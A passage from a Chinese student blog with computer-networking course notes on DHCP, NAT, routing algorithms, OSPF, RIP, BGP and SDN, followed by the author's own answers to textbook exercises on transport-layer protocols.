<li>DHCP服务器使用“DHCP提供”报文进行应答（广播方式，由于现在主机还没有获取IP地址，因此只能广播）。</li>
<li>主机使用DHCP请求报文请求IP地址。</li>
<li>DHCP服务器使用DHCP ACK报文响应。</li>
</ul>
<p>DHCP除了可以获取IP地址，还可以获取网关地址、DNS地址、子网掩码。其<font color=red>工作在应用层</font>，是引导程序协议的一种，属于局域网的网络协议，使用UDP协议工作。<br />
DHCP有3个端口，67和68作为正常的DHCP服务端口，分别是服务器和客户端的服务端口，546号端口用于DHCPv6客户端，这是为了特别开启DHCP failover服务。</p>
<h3 id="网络地址转换nat"><a class="markdownIt-Anchor" href="#网络地址转换nat"></a> 网络地址转换（NAT）</h3>
<p>其目的是让本地网络只使用一个IP地址就可以和外部网络相连，且不需要从ISP获取大批的IP地址，所有的设备可以使用同一个IP地址，可以在不通知外部网络的情况下改变内网主机的IP地址，即使改变了ISP也无需改变内网主机的IP地址，且内网主机对于外网主机是不可见的，不可寻址的。</p>
<p>实现方法：</p>
<ul>
<li>发送数据报：将每个外出报文的源IP地址和端口号替换为NAT的IP地址以及新的端口号，远程客户机或服务器将以NAT IP地址以及新的端口号作为目的地址进行响应。</li>
<li>网关存储每一个地址转换对，在接收数据报时根据NAT转换表将每一个进入报文的NAT IP地址和端口号替换为相应的源IP地址以及端口号。</li>
</ul>
<p>三种地址转换方式：</p>
<ul>
<li>静态NAT：一个本地地址对应于一个全球地址</li>
<li>动态NAT：一个全球地址对应于多个本地地址</li>
<li>端口NAT：一个本地地址的端口对应到一个全球地址的端口</li>
</ul>
<p>争议：</p>
<ul>
<li>端口号是用于进程编址而不是用于主机编址的</li>
<li>路由器仅应当处理高达第三层的分组</li>
<li>NAT协议违反了端到端原则，即主机彼此应当相互直接对话，结点不应该介入。</li>
<li>应该使用IPv6来解决IP地址的短缺问题</li>
</ul>
<h4 id="icmp因特网控制报文协议"><a class="markdownIt-Anchor" href="#icmp因特网控制报文协议"></a> ICMP：因特网控制报文协议</h4>
<p>用于主机、路由器、网关之间交换网络层信息，其传递的信息包括：</p>
<ul>
<li>错误报告，如主机、网络、端口、协议不可达等</li>
<li>回声请求/回答，如ping</li>
</ul>
<p>从体系结构上看其位于IP层之上，被封装在IP分组中。报文种类有两种：ICMP差错报告报文和询问报文。</p>
<h2 id="52-路由选择算法"><a class="markdownIt-Anchor" href="#52-路由选择算法"></a> 5.2 路由选择算法</h2>
<p><font color=red>默认路由器</font>：一台主机直接连接到的路由器<br />
<font color=red>源路由器</font>：源主机的默认路由器<br />
<font color=red>目的路由器</font>：目的主机的默认路由器</p>
<p>选路算法的目的：</p>
<ul>
<li>给定一组路由器以及连接路由器的链路，从中找到一条从源路由器到目标路由器的“好的”路径，这条路径通常需要拥有最低的成本。</li>
</ul>
<p>选路算法分类：</p>
<ul>
<li>根据信息是全局性还是分散性的进行分类
<ul>
<li>全局选路算法
<ul>
<li>所有路由器都知道整个网络的拓扑图以及链路的费用信息</li>
<li>链路状态算法</li>
</ul>
</li>
<li>分散式选路算法
<ul>
<li>每一个路由器仅有与其相连的链路的费用信息</li>
<li>通过迭代计算过程与相邻结点交换信息</li>
<li>距离向量算法</li>
</ul>
</li>
</ul>
</li>
<li>根据信息是静态还是动态进行分类
<ul>
<li>静态选路算法
<ul>
<li>随着时间的流逝，路由的变化很慢</li>
</ul>
</li>
<li>动态选路算法
<ul>
<li>路由信息可以很快地发生变化</li>
<li>需要对路由信息进行周期性的更新</li>
<li>可以相应拓扑或链路费用的变化</li>
</ul>
</li>
</ul>
</li>
<li>根据是否对负载敏感进行分类
<ul>
<li>负载敏感算法
<ul>
<li>链路费用会动态地变化以反映出链路的当前状况</li>
</ul>
</li>
<li>负载迟钝算法
<ul>
<li>链路费用不明显地反映链路的当前状况</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="dijkstra算法"><a class="markdownIt-Anchor" href="#dijkstra算法"></a> Dijkstra算法</h3>
<p>条件：</p>
<ul>
<li>所有结点都知道网络拓扑和链路费用
<ul>
<li>通过链路状态广播获得信息</li>
<li>所有结点具有该网络的同一个完整的视图</li>
</ul>
</li>
<li>计算从某结点到网络中所有其他结点的最低费用
<ul>
<li>为该结点提供转发表</li>
</ul>
</li>
<li>迭代：经过算法的K次迭代之后，可以知道到K个目的节点的最低费用路径。</li>
<li>通过跟踪前一跳结点可以构造最短路径树。</li>
</ul>
<p>复杂性：</p>
<ul>
<li>对于第一次迭代，需要搜索所有的n个结点以确定出结点w，w具有最低费用</li>
<li>在所有迭代中需要搜索的结点总数为n(n+1)/2，所以链路状态算法在最差情况下的复杂性为O(n<sup>2</sup>)</li>
<li>该算法的一种更复杂的实现（堆）可以降到O(nlogn)</li>
</ul>
<p>缺点：当路径的价值在不断变化时，每一次都需要重新进行计算，耗费资源。<br />
解决方案：</p>
<ul>
<li>强制链路费用不依赖于所承载的流量，但这无法解决高拥塞的问题</li>
<li>确保并非所有的路由器同时运行LS算法（链路状态路由选择算法），这样因特网上的路由器能够自同步，随机化路由器发送链路通告的时间。</li>
</ul>
<h2 id="53-ospf协议"><a class="markdownIt-Anchor" href="#53-ospf协议"></a> 5.3 OSPF协议</h2>
<p>OSPF协议是公开发表的，用于因特网中自治系统内部的路由选择。<br />
最短路径优先是因为使用了Dijkstra提出的最短路径算法SPF。这是一个分布式的链路状态协议。</p>
<p>链路状态在路由器之间交流使用的方法：洪泛法，其向本自治系统中所有路由器发送信息，<font color=red>发送的信息就是与本路由器相邻的所有路由器的链路状态</font>。只有当链路状态发生变化时，路由器采用洪泛法向所有路由器发送此信息。</p>
<p>由于各个路由器之间频繁交换链路状态信息，所有的路由器最终都能够建立一个<font color=red>链路状态数据库</font>。这个数据库实际上描述了全网的拓扑结构图，在全网范围是一致的。OSPF的链路状态数据能够较快地进行更新，使得各个路由器能够及时更新其路由表。<font color=red>OSPF的更新过程收敛快就是其重要优点</font>。</p>
<h4 id="ospf协议特点"><a class="markdownIt-Anchor" href="#ospf协议特点"></a> OSPF协议特点：</h4>
<ul>
<li>不强制如何设置链路权值的策略，但是提供对给定链路权值集合确定最低费用路径的机制。</li>
<li>即使链路状态未发生变化，每30分钟广播一次链路状态。</li>
<li>链路状态以OSPF通告形式封装于OSPF报文中，由IP分组承载，协议号89。</li>
<li>OSPF路由器之间的交换都是经过鉴别的，以确认OSPF通告的真实性以防止伪造和篡改。</li>
<li>OSPF通告具有序列号，可防止重放攻击。</li>
<li>OSPF中支持多条具有相同费用的路径。</li>
<li>OSPF支持多播选路和层次路由。</li>
</ul>
<h3 id="ospf距离向量选路算法"><a class="markdownIt-Anchor" href="#ospf距离向量选路算法"></a> OSPF距离向量选路算法</h3>
<p>特点：迭代、分布、自我终止、异步<br />
思想：</p>
<ul>
<li>d<sub>x</sub>(y)=min<sub>v</sub>{c(x, v)+d<sub>v</sub>(y)}</li>
<li>每一个路由器中都有一张路由表，包含3个内容：目的网络号、经过的邻居路由器、距离</li>
<li>路由器定期向其邻居路由器传送路由表的拷贝</li>
</ul>
<p>路由表更新算法：将每条边的权值都定义为1</p>
<ul>
<li>路由器X得到相邻路由器Y的路由表，从而得知：Y到网络Z的最短距离为N</li>
<li>如果路由器X没有到网络Z的路由条目，则添加一条经由路由器Y到网络Z距离为N+1的路由条目</li>
<li>如果路由器X已经有到网络Z的路由条目，其距离为M，如果M&gt;N+1，则更新该条目为经由路由器Y到网络Z距离为N+1，否则不更新。</li>
<li>特点：
<ul>
<li>好消息传播快，每一次发现距离更新的路径，都能够很快通知到邻居：
<ul>
<li>在t0时刻，y检测到链路费用变化，更新自己的距离向量，同时将这个变化通知给它的邻居</li>
<li>在t1时刻，z收到来自y的更新报文并更新了自己的距离向量表，计算出到x的新的最低费用，并向邻居发送它的新距离向量</li>
<li>在t2时刻，y收到来自z的更新并更新其距离向量表，Y的最低费用不变，因此y不发送任何报文给z。</li>
</ul>
</li>
<li>坏消息传播慢，如果一条链路的权值增大，每一次更新只能让链路最短距离增加1，这会导致路由选择环路（P252）。解决方案：毒性逆转，即如果z通过y选路到达目的地x，则z通告y其到x的距离为无穷大，这样在比较时不会产生上述情况，但仍然没有解决不可记数问题。涉及3个或更多结点的环路将无法使用毒性逆转技术检测到。</li>
</ul>
</li>
</ul>
<h3 id="链路状态路由选择算法ls-距离向量路由选择算法dv"><a class="markdownIt-Anchor" href="#链路状态路由选择算法ls-距离向量路由选择算法dv"></a> 链路状态路由选择算法LS &amp; 距离向量路由选择算法DV</h3>
<ul>
<li>从报文的复杂性来看：
<ul>
<li>LS：对于n个结点和E条链路，需要发送O(nE)个报文</li>
<li>DV：只对直连的邻居发送报文</li>
</ul>
</li>
<li>从收敛速度来看：
<ul>
<li>算法收敛时间依赖于许多因素，因此可变</li>
<li>LS：是一个要求O(nE)个报文的O(n<sup>2</sup>)算法，可能会存在震荡</li>
<li>DV：收敛时间不确定。可能会遇到环路选路和无穷记数问题</li>
</ul>
</li>
<li>从健壮性来看：
<ul>
<li>LS：结点能够向其连接的链路广播不正确费用，每一个结点只计算自己的转发表</li>
<li>DV：一个结点可以向任意或所有目的结点通告其不正确的最低费用路径，每一个结点的计算都会传递给它的邻居</li>
</ul>
</li>
</ul>
<h2 id="rip协议"><a class="markdownIt-Anchor" href="#rip协议"></a> RIP协议</h2>
<ul>
<li>相邻两点间链路上的费用定义为1，即只考虑源到目标经过多少个路由器，或多少“跳”</li>
<li>一条路径的最大费用限制为15</li>
<li>选路更新信息每30s在邻居之间以RIP响应报文的形式进行交换</li>
<li>路由器经过180s没有收到来自某个邻居的RIP通告，则认为该邻居已经离线，修改选路表，向其他邻居广播</li>
<li><font color=red>RIP是一个运行在UDP上的应用层协议</font>（端口520）</li>
</ul>
<h2 id="层次路由"><a class="markdownIt-Anchor" href="#层次路由"></a> 层次路由</h2>
<p>当因特网规模过大时，路由器无法存储每一台主机的选路信息，路由表更新的报文广播太多占用带宽。另外路由器也需要有一个子网管理的功能，每个网络管理员可能希望能够按照自己的愿望进行管理其网络。</p>
<p>解决方法：</p>
<ul>
<li>将路由器聚合到一个区域，形成一个自治系统（AS）</li>
<li>在相同AS内的路由器可以全部运行同样的选路算法：自治系统内部选路协议，最常用的是内部网关协议IGP，包含RIP和OSPF</li>
<li>在不同AS内的路由器可以运行不同的自治系统内部选路协议</li>
<li>转发表是由AS内部选路算法与AS间选路算法共同决定的，AS内部选路算法为内部目的地址设置转发表信息，AS内部选路算法与AS外部选路算法共同为外部目的地址设置转发表信息</li>
</ul>
<p>自治系统间路由器的任务：<br />
需要知道自己所在AS通过某个相邻的AS能够到达哪些AS，并将这些可达性信息向自身AS中的所有路由器传播。</p>
<p>当从源到目标在AS粒度下只有一条路可选时，源知道其哪一个接口在到AS边缘路由器的最低费用路径上，因此将接口与目标作为一对放入转发表。如果不止一条路可选，那么源必须确定通过哪一个网关路由器转发报文，其策略是<font color=red>将报文发送到最近的路由器</font>，即热土豆选路原则</p>
<h3 id="因特网中的as内层次路由层次ospf"><a class="markdownIt-Anchor" href="#因特网中的as内层次路由层次ospf"></a> 因特网中的AS内层次路由：层次OSPF</h3>
<ul>
<li>为了使得OSPF能够用于规模更大的网络，OSPF将一个自治系统再划分为若干个更小的范围，称为区域</li>
<li>每一个区域都有一个32bit的区域标识符</li>
<li>区域不能太大，一个区域内最好不要有200个以上路由器</li>
<li>划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个自治系统，这就减少了整个网络上的通信量。</li>
<li>在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域内的网络拓扑的情况。</li>
<li>OSPF使用层次结构的区域划分。在上层的区域叫做主干区域。主干区域的标识符规定为0.0.0.0，主干区域的作用是用于连通其他在下层的区域。</li>
</ul>
<h3 id="因特网上的as间路由bgp4"><a class="markdownIt-Anchor" href="#因特网上的as间路由bgp4"></a> 因特网上的AS间路由：BGP4</h3>
<ul>
<li>在自治系统之间寻找最佳路由的代价很大，不现实，因此需要考虑有关策略。</li>
<li>BGP为每一个AS提供一种手段，来处理
<ul>
<li>从相邻AS获取子网可达性信息</li>
<li>向该AS内部所有路由器传播这些可达性信息</li>
<li>基于该可达性信息和AS策略，决定达到子网的好路由</li>
<li>注意BGP只是寻找一个较好的路由，而不一定是最好的路由</li>
</ul>
</li>
</ul>
<p>每一个自治系统的管理员要选择至少一个路由器作为该自治系统的BGP发言人，一般两个发言人都是通过一个共享网络连接在一起的，而BGP发言人往往是BGP边界路由器，但也可以不是。</p>
<p>一个BGP发言人与其他自治系统中的BGP发言人交换路由信息，首先需要建立TCP连接，然后在此连接基础上交换BGP报文以建立BGP会话，利用BGP会话交换路由信息</p>
<p>使用TCP连接能够提供可靠服务，也简化了路由选择协议。</p>
<p>使用TCP连接交换路由信息的两个发言人彼此成为对方的邻站或对等站。</p>
<ul>
<li>BGP路由通告
<ul>
<li>一个AS可以集合多个前缀为一个，并使用BGP向其他AS通告单一前缀，则当前AS承诺它将沿着朝向该前缀的路径，转发指向该前缀的任何数据报。</li>
</ul>
</li>
<li>选路算法
<ul>
<li>在不同AS的网关路由器之间使用eBGP，一个AS向另一个AS发送一个自其自身可达的前缀列表。</li>
<li>而另一个AS的网关路由器使用iBGP对话向该AS中的其他路由器发布这些前缀。</li>
<li>这个AS内的其他网关路由器使用eBGP会话将学习到的前缀信息发布到与其直接相连的其他AS的网关路由器中。</li>
<li>当一个路由器得知一个新的前缀，它为该前缀在其转发表中创建一个表项。</li>
</ul>
</li>
<li>路径和BGP路由
<ul>
<li>当路由器通告一个前缀时，它随着前缀包含一些BGP属性，前缀+属性=路由。</li>
<li>两个重要属性：
<ul>
<li>AS_PATH：该属性包含了前缀的通告已经通过的那些AS</li>
<li>NEXT_HOP：指明到下一跳AS的具体的路由器（从当前AS到下一跳AS之间可能有多条链路）</li>
</ul>
</li>
<li>当一台网关路由器接收到一个路由器通告时，它使用输入策略决定是否接收或过滤该路由。</li>
</ul>
</li>
<li>BGP路由选择
<ul>
<li>一台路由器可能知道到一条前缀的多条路由路，路由器必须在可能的路由之中选择一条。消除规则：
<ul>
<li>本地偏好值：策略决定，具有最高本地偏好值的路由将被选择</li>
<li>最短AS-PATH：在余下的路由之中，具有最短AS-PATH的路由将被选择</li>
<li>从余下的路由中，选择具有最靠近NEXT-HOP路由器的路由：热土豆路由。</li>
<li>如果依然剩下多条路由，该路由器使用BGP标识来选择路由</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>步骤：</p>
<ul>
<li>路由器知晓前缀的存在性：通过BGP通告得知</li>
<li>确定此前缀的转发端口：使用BGP路由选择确定最佳域间路由，使用IGP路由选择确定最佳域内路由，确定最佳路由的转发端口</li>
<li>将（前缀，端口）表项放入转发表中</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/b0c5406d99d74ce6acff9f1951647399.png" alt="" /></p>
<h2 id="ip组播"><a class="markdownIt-Anchor" href="#ip组播"></a> IP组播</h2>
<p>组播：将数据分发给网络中处于同一个组的多台主机上的应用进程。</p>
<h2 id="55-sdn"><a class="markdownIt-Anchor" href="#55-sdn"></a> 5.5 SDN</h2>
<p>传统网络的问题：</p>
<ul>
<li>各个设备厂家网络层实现的方式各不相同，架构封闭，导致接口模糊封闭，功能单元界面不清晰。封闭架构导致设备制造商对新技术的驱动力不强，协议更新慢。</li>
</ul>
<p>路由器实现的控制平面：每一个路由器都具备独立的路由功能和数据转发功能，路由算法组件分布在不同的路由器上，彼此交互，计算生成转发表，构成分布式的控制平面。</p>
<p>实现目标：</p>
<ul>
<li>确定性路由：从固定源到固定目标要求经过固定的路由</li>
<li>负载均衡路由：从源到目标的多条路径上实现负载均衡</li>
</ul>
<p>解决方案：分层<br />
路由控制功能从本地路由器分离，汇聚到远程控制器，与路由器中的本地控制代理进行交互，来计算转发表。</p>
<p>SDN架构包含数据平面与控制平面，数据平面负责处理和转发数据包，根据转发状态和数据报头决定转发决策，而控制平面负责计算路由器的转发状态，确定数据报应该如何转发和转发到哪里，对路由、流量工程和防火墙状态管理控制，实现分布路由协议、手工配置或集中计算。不同的平面需要分别进行抽象，以满足SDN需求。</p>
<p><img src="https://img-blog.csdnimg.cn/7ad8eca1f6f44aeaac7b88047fc8723a.png" alt="" /></p>
<h3 id="openflow流表"><a class="markdownIt-Anchor" href="#openflow流表"></a> OpenFlow流表</h3>
<p>由多个流条目组成，流条目包括：</p>
<ul>
<li>
<p>头域：用于匹配规则确定输入报文是否与本条目匹配</p>
</li>
<li>
<p>计数器：用于与本流相关的跟踪统计</p>
</li>
<li>
<p>动作：描述交换机针对匹配报文采取的动作</p>
</li>
<li>
<p>OpenFlow交换机由OpenFlow协议、安全通道、报文匹配、流表与动作等构成。</p>
</li>
<li>
<p>报文匹配功能基于流表对输入报文进行匹配，将其引导至动作箱。</p>
</li>
<li>
<p>动作包括三种可选动作</p>
<ul>
<li>转发报文输出，可能先修改头域字段</li>
<li>丢弃报文</li>
<li>通过报文输入消息将报文转发至控制器</li>
</ul>
</li>
<li>
<p>控制器和交换机之间的报文通过安全通道传输</p>
</li>
<li>
<p>当控制器有报文需要通过交换机输出时采用PACKET_OUT消息</p>
</li>
<li>
<p>控制器直接指定输出端口</p>
</li>
<li>
<p>控制器通过报文匹配逻辑决定转发策略</p>
</li>
</ul>
<p>SDN控制平面：包括SDN控制器和SDN网络控制应用程序。</p>
<ul>
<li>控制平面基于网络的抽象，简化了网络编程控制</li>
<li>SDN控制平面包括两个层面的抽象：
<ul>
<li>流抽象-交换机API，通过OpenFlow协议与数据平面交互</li>
<li>映射抽象-网络API，控制器与网络控制应用程序之间交互</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC3%E7%AB%A0%E4%B9%A0%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC3%E7%AB%A0%E4%B9%A0%E9%A2%98/" class="post-title-link" itemprop="url">计算机网络——第3章习题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:46:40 / 修改时间：23:47:10" itemprop="dateCreated datePublished" datetime="2023-03-02T23:46:40+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="课后习题和问题"><a class="markdownIt-Anchor" href="#课后习题和问题"></a> 课后习题和问题</h2>
<h3 id="31~33"><a class="markdownIt-Anchor" href="#31~33"></a> 3.1~3.3</h3>
<ol>
<li>略</li>
<li>略</li>
<li>对于主机B发送到主机A的报文段，源端口号为y，目的端口号为x。</li>
<li>UDP的速度快，有些应用如实时视频可能不需要数据完全可靠，不希望受到拥塞控制。</li>
<li>因为语音和图像要求数据可靠准确，而UDP不能保证。标准答案：大多数防火墙被配置为阻止UDP通信，因此使用TCP处理视频和语音通信可以让通信通过防火墙。</li>
<li>可能，需要在应用层设置另外的校验程序，UDP本身是不提供可靠数据传输的。</li>
<li>是。注意<font color=red>UDP数据包中是没有IP地址的</font>，主机C是通过应用中的套接字来确定，在套接字接口处，有操作系统向进程提供IP地址，以确定各个报文段的源。</li>
<li>不同的套接字。对于每一个持久连接，Web服务器都会创建一个单独的“连接套接字”，每一个连接套接字都由一个四元组表示：源IP地址、源端口号、目的IP地址、目的端口号。当主机C接收IP数据报时，检查报文中的这4个字段，以确定将这个数据报上传到哪一个套接字。用于连接两台主机的套接字中都以80作为目的端口。注意<font color=red>当传输层将TCP报文段的有效负载传递给应用程序进程时，不会指定源IP地址，因为这是由套接字标识符隐式指定的，这与UDP不同。可以理解为，TCP会将从不同源发送的报文段分到不同的套接字，因此不需要另外指定源IP。</font></li>
</ol>
<h3 id="34"><a class="markdownIt-Anchor" href="#34"></a> 3.4</h3>
<ol start="9">
<li>标识一个ACK是对应于哪一个报文段的。<font color=red>接收方的确认报文如果在链路中发生了错误，发送方就只能重新发送一次这个报文，但是接收方不知道这个报文是一个新的报文还是上一个报文的重传，因此需要标识。</font></li>
<li>如果报文丢失，就需要重传报文，设置定时器的目的是防止丢包导致无限等待，在定时器到达一定的时间之后认定为丢包，即直接重传。如果收到了ACK，则重启该定时器。</li>
<li>是，在往返时延固定的情况下，定时器只要检测到在往返时延之内没有接收到希望的ACK报文即可重传报文。</li>
<li><a target="_blank" rel="noopener" href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/content/interactiveanimations/go-back-n-protocol/index.html">小程序</a><br />
a. 毁掉第一个分组之后，会发送4个序号相同的ACK报文，并开启定时器，在一段时间之后发送方重新发送5个报文。这里解释一下，由于第一个报文被毁，因此接收方只能够发送上一次成功接收的序号的ACK，发送方能够收到4个相同序号的ACK，其需要等待一段时间确认第5个ACK是否正在发送，如果能够成功收到第5个报文，则说明发送方发送数据报到接收方时出现了失序，序号最小的数据报反而是最后被接收的；如果计时器结束，就全部进行重传。<br />
b. 此时窗口会移动，因为发送方接收到了序号更大的ACK，这说明前面的数据报都已经被成功接收，即使第一个ACK丢失也不影响窗口右移。<br />
c. 无法发送第6个分组，因为窗口大小只有5。</li>
<li><a target="_blank" rel="noopener" href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/content/interactiveanimations/selective-repeat-protocol/index.html">小程序</a><br />
选择重传的不同之处在于，其ACK报文与GBN的ACK报文表达的含义不同了，选择重传的ACK报文只能表示该序号的数据报正常接收，而GBN的ACK报文表示该序号及小于该序号的所有数据报均已经被正常接收。因此选择重传只会重传没有收到ACK的序号的数据报，并在窗口的第一个数据报收到时调整窗口的位置，使得窗口的第一个序号永远处于没有被确认的状态。</li>
</ol>
<h3 id="35"><a class="markdownIt-Anchor" href="#35"></a> 3.5</h3>
<ol start="14">
<li>a. 错误，TCP协议中接收方需要发送确认数据报，与随数据捎带确认没有关系。<br />
b. 错误，rwnd全称为receive window，即接收窗口，其值等于接收缓存-（接收到的字节数-主机应用进程从缓存读出的字节数），因此该值是一直在动态变化的。<br />
c. 正确。<br />
d. 错误，报文段的序号是按照字节编址的，下一个报文段的序号应该等于该报文段的序号+该报文段的长度。<br />
e. 正确。<br />
f. 错误。TimeoutInterval = EstimatedRTT + 4 × DevRTT = (1-α) × EstimatedRTT + α × SampleRTT + 4 × ((1-β) × DevRTT + β × |SampleRTT - EstimatedRTT|)，无法推导出该题结论。<br />
g. 错误，TCP通信双方的序号是各自决定的，因此确认号与序号没有直接的关系。</li>
<li>20字节；90</li>
<li>3个报文段：<br />
Seq=43, Ack=80<br />
Seq=80, Ack=44<br />
Seq=44, Ack=81</li>
</ol>
<h3 id="37"><a class="markdownIt-Anchor" href="#37"></a> 3.7</h3>
<ol start="17">
<li>R/2，TCP可以通过调度使得链路中多个连接的吞吐量基本公平。</li>
<li>错误，应该被设置为门限值的一半。</li>
<li>略</li>
</ol>
<h2 id="习题"><a class="markdownIt-Anchor" href="#习题"></a> 习题</h2>
<ol>
<li>e. 可能相同。<br />
f. 同一台主机不可能相同。</li>
<li>主机A连接：源端口80，目的端口26145；主机C连接：源端口80，目的端口7532</li>
<li>11010001，接收方将带有反码的4个8比特求和，结果为全1则验证完成。1比特的差错可以出来，但2比特的错误可能不能检测出来。</li>
<li>a. 00111110<br />
b. 10111111<br />
c. 将最低位的0改成1，1改成0。</li>
<li>不能绝对确信。</li>
<li>在发送方发送分组1时，接收方接收完成并发送一个ACK，但ACK损坏，发送方收到损坏的ACK之后重传分组1，但接收方要的不是分组1，因此会返回NAK，发送方误以为分组1传输错误就会继续重传，由此陷入死锁状态。</li>
<li>不理解题意。</li>
<li>与rdt2.2的FSM相同</li>
<li>略</li>
<li><img src="https://img-blog.csdnimg.cn/e493f4c3298f450eac99777b8cc6b5cc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAc3VwZXJtYXgyMDIw,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /><br />
需要将计时器设置为最大往返时延与处理时间之和，每一次发送新的数据分组时重启计时器。</li>
<li>不能正常工作。如果在收到重复的数据包或数据包损坏的情况下不发送数据包，那么发送方就永远无法收到来自接收方的任何确认信息，就会一直等待下去，进入死锁的状态。注意rdt 3.0之前的所有版本都是没有计时器的。</li>
<li>仅有一个比特差错时，能够正常运行。如果定时器过早超时，那么对于序号为n的分组将会重传n次。流程：发送1分组，在ACK1被接收前计时器超时，重传1次1分组，然后接收到1ACK，发送2分组，在ACK2被接收前计时器超时，重传1次2分组，然后接收到来自第1次重传1分组的ACK1回应，第2次重传2分组，然后收到ACK2，发送3分组，超时第一次重传3分组，接收到两次2分组重传的回应ACK2，再重传2次3分组……可以发现1分组重传了1次，2分组重传了2次，……n分组将会重传n次。</li>
<li>如果能够重排报文顺序，首先发送老1分组，回应的老ACK1迟迟未到，重传1次老1分组，收到ACK1，然后发送0分组，接收方接收到0分组之后发送1个0分组ACK，此时链路中有1个ACK0和1个ACK1，且ACK1是先进入链路的，但如果ACK0首先被收到，那么会发送新1分组，如果此时接收到ACK1分组，注意这个分组确认的是老1分组，那么发送方就会误以为新1分组已经被收到，会继续发送新0分组，如果新1分组没能被收到，那么接收方就会产生错误，迟迟无法收到新1分组。</li>
<li>不会，因为如果只使用NAK，当发送方发送数据的频率较低时，如果编号为x的数据包没能成功接收，那么接收方只有在接收到编号为x+1的数据包时才能察觉到编号为x的数据包接收错误，才能发送NAK，这会降低效率。如果发送方要发送大量的数据，且该端到端连接很少丢包，则只使用NAK协议会比使用ACK的协议更好，因为少发送了很多的确认数据包。</li>
<li>RTT=30ms，传输时延为0.012ms，如果不考虑ACK分组的传输时延与接收方的处理时间，那么一个分组从开始发送到接收到确认信息一共需要30.012ms，其中忙的时间为0.012ms，要使得忙的时间超过90%，那么需要在前面分组还没有被确认的情况下发送新的分组，设一共需要发送x个分组才能使忙的时间超过90%，则有0.012x/30.012&gt;90%，解得x=2251，这即是窗口的最小值</li>
<li>能增加信道利用率，因为发送方能够持续不断地接收到ACK，从而发送分组的时间间隔就会短很多，但出现差错时很难检测到，且发送方的ACK会占用带宽资源。</li>
<li>略</li>
<li>报文格式与SR协议相同。</li>
<li>略</li>
<li>略</li>
<li>略</li>
<li>a. k-4~k+3都有可能。极端情况：所有分组全部被正常接收，但所有ACK全部丢失，此时接收方分组第一个序号为k，但发送方分组第一个序号为k-4；另所有分组全部传回ACK，则发送方分组第四个序号为k+3，此时发送方与接收方窗口位置相同。<br />
b. k-4~k-1都有可能。发送方发送k-5，接收方收到并且返回ACK(k-5)。发送方收到之前就超时，重发k-5。 发送方收到ACK(k-5)， 发送k-4, k-3, k-2, k-1。接收方收到重发k-5，返回ACK(k-5)。收到k-4, k-3, k-2, k-1，返回ACK(k-4)，ACK(k-3)，ACK(k-2)，ACK(k-1)</li>
<li>对于GBN协议，窗口的最大值为k-1；对于SR协议，窗口的最大值为k/2。需要保证当接收方全部接收到且ACK全部丢失时，接收方能够识别出发送方重传的任何一个分组是老分组而不是新分组。</li>
<li>a. 正确。当出现超时重传时，可能会收到落在窗口前面的ACK。<br />
b. 正确。同样是超时重传，另外窗口的第一个ACK丢失也可能导致收到落在窗口前面的ACK。<br />
c. 正确<br />
d. 正确</li>
<li>因为UDP协议是即时传输，应用程序将数据传递给UDP之后UDP协议就会尽快进行传输，而TCP可能还会对这些数据进行缓存、分片等操作，从而降低了应用程序的控制能力。因为TCP有拥塞控制，而UDP没有，应用程序使用UDP可以完全自行调节发送速度等。</li>
<li>a. 在序号不重复利用的情况下，TCP报文的序号最大值为2<sup>32</sup>-1，那么L的最大值应该为2<sup>32</sup>。<br />
b. 需要使用8012999个分组来封装这么多数据，加上首部分组的长度，一共需要传输2<sup>32</sup>+8012999×64字节的数据，需要大约237s的时间。</li>
